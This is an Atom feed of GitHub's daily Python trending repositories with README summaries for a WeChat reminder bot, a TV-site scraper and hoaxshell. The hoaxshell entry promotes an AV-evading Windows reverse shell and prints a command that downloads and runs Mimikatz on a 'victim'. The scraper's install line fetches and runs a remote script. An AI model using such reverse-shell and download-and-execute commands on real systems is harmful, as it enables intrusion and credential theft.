<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2022-08-27T01:43:54Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>limoest/daily_reminder</title>
    <updated>2022-08-27T01:43:54Z</updated>
    <id>tag:github.com,2022-08-27:/limoest/daily_reminder</id>
    <link href="https://github.com/limoest/daily_reminder" rel="alternate"></link>
    <summary type="html">&lt;p&gt;微信公众号全自动每日推送&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！先把这儿往下的东西全都看完！！编辑文件的时候把浏览器自动翻译关了！！！！！！！！！！！！！！&lt;/h1&gt; &#xA;&lt;p&gt;🔺🔺可以点一下小星星么可以点一下小星星么可以点一下小星星么🔺🔺&lt;/p&gt; &#xA;&lt;p&gt;有实在解决不了的问题 加vx OWI7404&lt;/p&gt; &#xA;&lt;h2&gt;🔺图文教程链接🔺&lt;/h2&gt; &#xA;&lt;h2&gt;&lt;a href=&#34;https://www.coolapk.com/feed/38579891?shareKey=NGI3ZGZlZTM4MDBjNjMwMzdlM2M~&amp;amp;shareUid=3198334&amp;amp;shareFrom=com.coolapk.app_4.10&#34;&gt;https://www.coolapk.com/feed/38579891?shareKey=NGI3ZGZlZTM4MDBjNjMwMzdlM2M~&amp;amp;shareUid=3198334&amp;amp;shareFrom=com.coolapk.app_4.10&lt;/a&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;🔺视频教程链接🔺&lt;/h2&gt; &#xA;&lt;h2&gt;&lt;a href=&#34;https://b23.tv/rJ6zEwr&#34;&gt;https://b23.tv/rJ6zEwr&lt;/a&gt; &lt;a href=&#34;https://v.douyin.com/jqLpMu3/&#34;&gt;https://v.douyin.com/jqLpMu3/&lt;/a&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;🔺微信测试平台(🔺如果自己有公众号的，去后台👉左上角三条横线👉基本配置。然后就能看到了)&lt;/h2&gt; &#xA;&lt;h2&gt;&lt;a href=&#34;http://mp.weixin.qq.com/debug/cgi-bin/sandboxinfo?action=showinfo&amp;amp;t=sandbox/index&#34;&gt;http://mp.weixin.qq.com/debug/cgi-bin/sandboxinfo?action=showinfo&amp;amp;t=sandbox/index&lt;/a&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;🔺和风天气控制台🔺&lt;/h2&gt; &#xA;&lt;h2&gt;&lt;a href=&#34;https://id.qweather.com/&#34;&gt;https://id.qweather.com/&lt;/a&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;🔺模板内容如下：🔺 (这个可以自由发挥)&lt;/h2&gt; &#xA;&lt;p&gt;{{date.DATA}}&lt;/p&gt; &#xA;&lt;p&gt;地区：{{region.DATA}}&lt;/p&gt; &#xA;&lt;p&gt;天气：{{weather.DATA}}&lt;/p&gt; &#xA;&lt;p&gt;气温：{{temp.DATA}}&lt;/p&gt; &#xA;&lt;p&gt;风向：{{wind_dir.DATA}}&lt;/p&gt; &#xA;&lt;p&gt;今天是我们恋爱的第{{love_day.DATA}}天&lt;/p&gt; &#xA;&lt;p&gt;{{birthday1.DATA}}&lt;/p&gt; &#xA;&lt;p&gt;{{birthday2.DATA}}&lt;/p&gt; &#xA;&lt;p&gt;{{note_en.DATA}}&lt;/p&gt; &#xA;&lt;p&gt;{{note_ch.DATA}}&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;🔺🔺关于自动运行：🔺🔺&lt;/h2&gt; &#xA;&lt;p&gt;默认开着 时间是早上七点 手动运行一次确认成功后即可 (🔺🔺建议设置成凌晨三四点 早上起床能看到就好了)&lt;/p&gt; &#xA;&lt;p&gt;总是会抽风有延迟 可以参考这篇文章 &lt;a href=&#34;https://blog.csdn.net/l1937gzjlzy/article/details/117753465&#34;&gt;https://blog.csdn.net/l1937gzjlzy/article/details/117753465&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;🔺🔺更改时间的步骤🔺🔺 &lt;img src=&#34;https://raw.githubusercontent.com/limoest/daily_reminder/main/others/a.png&#34; alt=&#34;image&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/limoest/daily_reminder/main/others/b.png&#34; alt=&#34;image&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/limoest/daily_reminder/main/others/c.png&#34; alt=&#34;image&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/limoest/daily_reminder/main/others/d.png&#34; alt=&#34;image&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/limoest/daily_reminder/main/others/e.png&#34; alt=&#34;image&#34;&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;🔺🔺天气key生成教程🔺🔺&lt;/h2&gt; &#xA;&lt;h2&gt;&lt;img src=&#34;https://raw.githubusercontent.com/limoest/daily_reminder/main/others/%E5%92%8C%E9%A3%8E%E5%A4%A9%E6%B0%94key%E7%94%9F%E6%88%90.png&#34; alt=&#34;image&#34;&gt;&lt;/h2&gt; &#xA;&lt;h2&gt;🔺🔺可以去天行数据申请各种各样的接口用来推送 🔺🔺&lt;/h2&gt; &#xA;&lt;h2&gt;&lt;img src=&#34;https://raw.githubusercontent.com/limoest/daily_reminder/main/others/Snipaste_2022-08-24_12-13-19.png&#34; alt=&#34;image&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/limoest/daily_reminder/main/others/Snipaste.png&#34; alt=&#34;image&#34;&gt;&lt;/h2&gt; &#xA;&lt;p&gt;有别的建议欢迎留言&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>t3l3machus/hoaxshell</title>
    <updated>2022-08-27T01:43:54Z</updated>
    <id>tag:github.com,2022-08-27:/t3l3machus/hoaxshell</id>
    <link href="https://github.com/t3l3machus/hoaxshell" rel="alternate"></link>
    <summary type="html">&lt;p&gt;An unconventional Windows reverse shell, currently undetected by Microsoft Defender and various other AV solutions, solely based on http(s) traffic.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;hoaxshell&lt;/h1&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.python.org/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/python-3.x-yellow.svg?sanitize=true&#34; alt=&#34;Python 3.x&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/badge/powershell-%E2%89%A5%20v3.0-blue&#34;&gt; &lt;a href=&#34;https://github.com/t3l3machus/hoaxshell/raw/main/LICENSE.md&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/license-BSD-red.svg?sanitize=true&#34; alt=&#34;License&#34;&gt;&lt;/a&gt; &lt;img src=&#34;https://img.shields.io/badge/Maintained%3F-Yes-96c40f&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Purpose&lt;/h2&gt; &#xA;&lt;p&gt;hoaxshell is an unconventional Windows reverse shell, currently undetected by Microsoft Defender and possibly other AV solutions as it is solely based on http(s) traffic. The tool is easy to use, it generates it&#39;s own PowerShell payload and it supports encryption (ssl).&lt;/p&gt; &#xA;&lt;p&gt;So far, it has been tested on fully updated &lt;strong&gt;Windows 11 Enterprise&lt;/strong&gt; and &lt;strong&gt;Windows 10 Pro&lt;/strong&gt; boxes (see video and screenshots).&lt;/p&gt; &#xA;&lt;h3&gt;Video Presentation&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://www.youtube.com/watch?v=SEufgD5UxdU&#34;&gt;https://www.youtube.com/watch?v=SEufgD5UxdU&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Screenshots&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.github.com/t3l3machus/hoaxshell/master/screenshots/hoaxshell-win11-v2.png&#34; alt=&#34;usage_example_png&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;Find more screenshots &lt;a href=&#34;https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/screenshots/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;git clone https://github.com/t3l3machus/hoaxshell&#xA;cd ./hoaxshell&#xA;sudo pip3 install -r requirements.txt&#xA;chmod +x hoaxshell.py&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: As a means of avoiding detection, hoaxshell is automatically generating random values for the session id, URL paths and name of a custom http header utilized in the process, every time the script is started. The generated payload will work only for the instance it was generated for. Use the &lt;code&gt;-g&lt;/code&gt; option to bypass this behaviour and re-establish an active session or reuse a past generated payload with a new instance of hoaxshell.&lt;/p&gt; &#xA;&lt;h4&gt;Basic shell session over http&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;When you run hoaxshell, it will generate its own PowerShell payload for you to copy and inject on the victim. By default, the payload is base64 encoded for convenience. If you need the payload raw, execute the &#34;rawpayload&#34; prompt command or start hoaxshell with the &lt;code&gt;-r&lt;/code&gt; argument. After the payload has been executed on the victim, you&#39;ll be able to run PowerShell commands against it.&lt;/p&gt; &#xA;&lt;h4&gt;Encrypted shell session (https):&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;# Generate self-signed certificate:&#xA;openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365&#xA;&#xA;# Pass the cert.pem and key.pem as arguments:&#xA;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt; -c &amp;lt;/path/to/cert.pem&amp;gt; -k &amp;lt;path/to/key.pem&amp;gt;&#xA;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;The generated PowerShell payload will be longer in length because of an additional block of code that disables the ssl certificate validation.&lt;/p&gt; &#xA;&lt;h4&gt;Grab session mode&lt;/h4&gt; &#xA;&lt;p&gt;In case you close your terminal accidentally, have a power outage or something, you can start hoaxshell in grab session mode, it will attempt to re-establish a session, given that the payload is still running on the victim machine.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;sudo python3 hoaxshell.py -s &amp;lt;your_ip&amp;gt; -g&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;strong&gt;Important&lt;/strong&gt;: Make sure to start hoaxshell with the same settings as the session you are trying to restore (http/https, port, etc).&lt;/p&gt; &#xA;&lt;h2&gt;Limitations&lt;/h2&gt; &#xA;&lt;p&gt;The shell is going to hang if you execute a command that initiates an interactive session. Example:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# this command will execute succesfully and you will have no problem: &#xA;&amp;gt; powershell echo &#39;This is a test&#39;&#xA;&#xA;# But this one will open an interactive session within the hoaxshell session and is going to cause the shell to hang:&#xA;&amp;gt; powershell&#xA;&#xA;# In the same manner, you won&#39;t have a problem executing this:&#xA;&amp;gt; cmd /c dir /a&#xA;&#xA;# But this will cause your hoaxshell to hang:&#xA;&amp;gt; cmd.exe&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;So, if you for example would like to run mimikatz throught hoaxshell you would need to invoke the commands:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;hoaxshell &amp;gt; IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.13:4443/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Command &#39;&#34;PRIVILEGE::Debug&#34;&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Long story short, you have to be careful to not run an exe or cmd that starts an interactive session within the hoaxshell powershell context.&lt;/p&gt; &#xA;&lt;h2&gt;Future&lt;/h2&gt; &#xA;&lt;p&gt;I am currently working on some auxiliary-type prompt commands to automate parts of host enumeration.&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>sec-an/TV_Spider</title>
    <updated>2022-08-27T01:43:54Z</updated>
    <id>tag:github.com,2022-08-27:/sec-an/TV_Spider</id>
    <link href="https://github.com/sec-an/TV_Spider" rel="alternate"></link>
    <summary type="html">&lt;p&gt;TVBoxOSC 服务端爬虫 Custom Server Spider for Tv Written in Python3&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;TV_Spider&lt;/h1&gt; &#xA;&lt;p&gt;服务端爬虫 T4&lt;/p&gt; &#xA;&lt;p&gt;基于Python 3&lt;/p&gt; &#xA;&lt;h3&gt;&lt;code&gt;仅供Python爬虫学习交流使用！切勿用于违法用途，否则开发者不承担任何责任。&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;h3&gt;&lt;code&gt;欢迎Star 欢迎PR&lt;/code&gt;&lt;/h3&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;安装方法&lt;/h2&gt; &#xA;&lt;h3&gt;1. Docker安装步骤&lt;/h3&gt; &#xA;&lt;p&gt;创建镜像：&lt;/p&gt; &#xA;&lt;p&gt;docker image build -t tv:latest .&lt;/p&gt; &#xA;&lt;p&gt;运行容器：&lt;/p&gt; &#xA;&lt;p&gt;docker run --name TV --net=&#34;host&#34; -v /opt/TV（源码所在目录）:/TV tv:latest gunicorn -w 4 -b 0.0.0.0:8080 app:app&lt;/p&gt; &#xA;&lt;p&gt;脚本安装、更新：&lt;/p&gt; &#xA;&lt;p&gt;注意：需要提前安装unzip。openwrt：opkg update &amp;amp;&amp;amp; opkg install unzip。ubuntu、debian：apt-get update &amp;amp;&amp;amp; apt-get install unzip。其他系统自行百度。&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;2. 自定义脚本安装--Docker&lt;/h3&gt; &#xA;&lt;p&gt;下载T4update.sh脚本到任意目录，赋予执行权限。如果有需要自定义内容，请进入脚本在响应位置自行修改。&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/lm317379829/TV-Spider/main/pic/T4update%E8%AF%B4%E6%98%8E.jpg&#34; alt=&#34;T4update说明&#34;&gt;&lt;/p&gt; &#xA;&lt;p&gt;运行脚本，完成安装。&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;3. 一键安装--Docker&lt;/h3&gt; &#xA;&lt;p&gt;一键安装命令：&lt;/p&gt; &#xA;&lt;p&gt;wget --no-check-certificate -qO- &#34;&lt;a href=&#34;https://raw.githubusercontent.com/sec-an/TV_Spider/main/T4update.sh&#34;&gt;https://raw.githubusercontent.com/sec-an/TV_Spider/main/T4update.sh&lt;/a&gt;&#34; -O &#39;/tmp/T4update.sh&#39; &amp;amp;&amp;amp; chmod +x /tmp/T4update.sh &amp;amp;&amp;amp; bash /tmp/T4update.sh &amp;amp;&amp;amp; rm /tmp/T4update.sh&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h3&gt;4. 使用宝塔安装&lt;/h3&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/sec-an/TV_Spider/raw/main/doc/install_through_btpanel.md&#34;&gt;使用宝塔安装的简略步骤&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;当前支持的站点（站点根域名字典序）&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Tag&lt;/th&gt; &#xA;   &lt;th align=&#34;center&#34;&gt;Name&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;bdys01&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.bdys01.com&#34;&gt;哔滴影视&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;bttwoo&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.bttwoo.com/&#34;&gt;两个BT&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;cokemv&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://cokemv.me/&#34;&gt;COKEMV影视&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;czspp&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://czspp.com/&#34;&gt;厂长资源&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;ddys&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://ddys.tv/&#34;&gt;低端影视&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;dy555&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://555dy.fun/&#34;&gt;555电影&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;gitcafe&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://u.gitcafe.net/&#34;&gt;小纸条&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;libvio&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.libvio.me/&#34;&gt;LIBVIO影视&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;onelist&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://onelist.top/&#34;&gt;Onelist&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;smdyy&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.smdyy.cc/&#34;&gt;神马影院&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;voflix&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://www.voflix.com/&#34;&gt;VOFLIX HD&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;yiso&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://yiso.fun/&#34;&gt;易搜-网盘搜索&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;code&gt;zhaoziyuan&lt;/code&gt;&lt;/td&gt; &#xA;   &lt;td align=&#34;center&#34;&gt;&lt;a href=&#34;https://zhaoziyuan.me/&#34;&gt;找资源&lt;/a&gt;&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;在json中调用&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;{&#xA;    &#34;key&#34;:&#34;t4test&#34;,&#xA;    &#34;name&#34;:&#34;T4测试&#34;,&#xA;    &#34;type&#34;:4,&#xA;    // 参数sites可筛选站点，tag用,隔开，不加或sites=all为搜索所有支持的站点&#xA;    // 参数ali_token提供阿里系的搜索播放功能（非必须）&#xA;    // 参数timeout提供聚合搜索限时返回结果功能，超时数据不再等待，默认5秒&#xA;    &#34;api&#34;:&#34;http://127.0.0.1:8080/vod?sites=all&amp;amp;ali_token=3xx9cfxxxx509bxx&amp;amp;timeout=5&#34;,&#xA;    // &#34;api&#34;:&#34;http://127.0.0.1:8080/vod&#34;,&#xA;    // &#34;api&#34;:&#34;http://127.0.0.1:8080/vod?sites=czspp,yiso&#34;,&#xA;    // &#34;api&#34;:&#34;http://127.0.0.1:8080/vod?ali_token=3xx9cfxxxx509bxx&#34;,&#xA;    &#34;searchable&#34;:1,&#xA;    &#34;quickSearch&#34;:1,&#xA;    &#34;filterable&#34;:0&#xA;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;安装依赖&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;pip install -r requirements.txt&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h2&gt;运行&lt;/h2&gt; &#xA;&lt;p&gt;&lt;code&gt;gunicorn -w 4 -b 0.0.0.0:8080 app:app&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h2&gt;说明&lt;/h2&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;部分爬虫代码参考自&lt;a href=&#34;https://github.com/Tangsan99999/TvJar&#34;&gt;Tangsan99999 / TvJar&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt;</summary>
  </entry>
</feed>